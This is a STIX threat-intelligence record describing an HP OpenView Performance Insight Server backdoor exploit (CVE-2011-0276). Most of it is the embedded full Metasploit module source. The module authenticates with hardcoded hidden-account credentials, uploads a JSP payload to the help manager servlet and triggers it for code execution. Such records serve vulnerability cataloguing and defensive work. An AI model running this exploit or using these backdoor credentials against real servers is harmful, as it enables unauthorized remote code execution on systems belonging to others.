{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77a512b7-2534-4e39-ac4f-dece73aec3ca",
    "created": "2024-08-14T16:55:36.166723Z",
    "modified": "2024-08-14T16:55:36.166727Z",
    "name": "HP OpenView Performance Insight Server Backdoor Account Code Execution",
    "description": " This module exploits a hidden account in the com.trinagy.security.XMLUserManager Java class. When using this account, an attacker can abuse the com.trinagy.servlet.HelpManagerServlet class and write arbitrary files to the system allowing the execution of arbitrary code.  NOTE: This module has only been tested against HP OpenView Performance Insight Server 5.41.0 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/hp_openview_insight_backdoor.rb",
            "external_id": "hp_openview_insight_backdoor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-0276"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP OpenView Performance Insight Server Backdoor Account Code Execution',\n      'Description'    => %q{\n          This module exploits a hidden account in the com.trinagy.security.XMLUserManager Java\n        class. When using this account, an attacker can abuse the\n        com.trinagy.servlet.HelpManagerServlet class and write arbitrary files to the system\n        allowing the execution of arbitrary code.\n\n        NOTE: This module has only been tested against HP OpenView Performance Insight Server 5.41.0\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2011-0276' ],\n          [ 'OSVDB', '70754' ],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2011-01-31'))\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'The username to authenticate as', 'hch908v' ]),\n        OptString.new('PASSWORD', [ true, 'The password for the specified username', 'z6t0j$+i' ])\n      ])\n\n  end\n\n  def exploit\n\n    creds = \"#{datastore['USERNAME']}\" + \":\" + \"#{datastore['PASSWORD']}\"\n\n    dir  = rand_text_alpha_upper(rand(8) + 1)\n    page = rand_text_alpha_upper(8) + \".jsp\"\n    uid  = rand(20).to_s\n\n    file =  \"-----------------------------#{uid}\\r\\n\"\n    file << \"Content-Disposition: form-data; name=\\\"filename\\\"; filename=\\\"#{page}\\\"\\r\\n\"\n    file << \"Content-Type: application/x-java-archive\\r\\n\\r\\n\"\n    file << payload.encoded + \"\\r\\n\"\n    file <<  \"-----------------------------#{uid}\\r\\n\"\n    # if (p.getName().equals(\"location\")); ...\n    file << \"Content-Disposition: form-data; name=\\\"location\\\"\\r\\n\"\n    file << \"Content-Type: text/plain\\r\\n\\r\\n\"\n    file << dir + \"\\r\\n\"\n    file << \"-----------------------------#{uid}\\r\\n\\r\\n\"\n\n    print_status(\"Sending our POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'\t\t=> \"/reports/helpmanager\",\n        'version'\t=> '1.1',\n        'method'\t=> 'POST',\n        'ctype'         => 'multipart/form-data; boundary=---------------------------' + uid,\n        'data'\t\t=> file,\n        'headers'\t=>\n          {\n=begin\nthis.internal = new User(\"hch908v\");\nthis.internal.setName(\"hidden user\");\nthis.internal.setEncryptedPassword(TrendCrypt.crypt(\"hch908v\", \"z6t0j$+i\"));\nthis.internal.addRole(\"user\");\nthis.internal.addRole(\"admin\");\n=end\n            'Authorization' =>  \"Basic #{Rex::Text.encode_base64(creds)}\",\n\n          }\n      }, 5)\n\n    if ( res and res.code == 200 )\n      print_good(\"Login/Upload successful. Triggering payload at '/help/#{dir}/#{page}'...\")\n      send_request_raw({\n          'uri'\t\t=> \"/help/#{dir}/#{page}\",\n          'method'\t=> 'GET',\n          'version'\t=> '1.0',\n      }, 5)\n\n      handler\n    else\n      print_error(\"Login/Upload refused!\")\n      return\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-01-31",
    "x_mitre_platforms": [
        "win'"
    ]
}